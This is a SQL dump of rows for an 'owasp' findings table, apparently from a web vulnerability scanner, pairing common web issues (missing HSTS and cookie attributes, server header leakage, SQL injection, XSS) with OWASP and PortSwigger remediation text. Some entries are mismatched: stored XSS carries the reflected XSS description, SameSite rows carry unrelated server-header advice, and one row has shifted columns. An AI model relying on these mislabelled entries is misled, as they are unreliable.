(163, 'Web Server Infomation Leakage through Server header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 159, 'Low'),
(164, 'Missing HTTP Strict Transport Security Header', 'Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundam', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 159, 'Low'),
(165, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 160, 'Low'),
(166, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 160, 'Low'),
(167, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 161, 'Medium'),
(168, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 161, 'Low'),
(169, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'Implement SameSiteAttribute in Cookies', NULL, 'WSTG-SESS-02', 161, 'Low'),
(170, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 161, 'Low'),
(171, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 161, 'Low'),
(172, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 162, 'Low'),
(173, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 162, 'Low'),
(174, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 162, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(175, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 168, 'High'),
(176, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 168, 'High'),
(177, 'Directory Traversal File Include', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-ATHZ-01', 168, 'Medium'),
(178, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 168, 'Low'),
(179, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 168, 'Low'),
(180, 'Directory Traversal File Include', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-ATHZ-01', 167, 'Medium'),
(181, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 167, 'High'),
(182, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 168, 'Low'),
(183, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 169, 'Medium'),
(184, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 169, 'Low'),
(185, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 169, 'Low'),
(186, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 169, 'Low'),
(187, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 169, 'Low'),
(188, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 170, 'Low'),
(189, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 170, 'Low'),
(190, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 178, 'Low'),
(191, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 178, 'Low'),
(192, 'Web Server Infomation Leakage through Server header', 'Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:\n\nObscuring web server information in headers, such as with Apache’s mod_headers module.\nUsing a hardened reverse proxy server to create an additional layer of security between the web server and the Internet.\nEnsuring that web servers are kept up-to-date with the latest software and security patches.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server', NULL, 'WSTG-INFO-02', 178, 'Low'),
(193, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 178, 'Low'),
(194, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 178, 'Medium'),
(195, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 67, 'High'),
(196, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 180, 'Low'),
(197, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 180, 'Low'),
(198, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 180, 'Low'),
(199, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 180, 'Low'),
(200, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 180, 'High'),
(201, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 180, 'High'),
(202, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 180, 'Medium'),
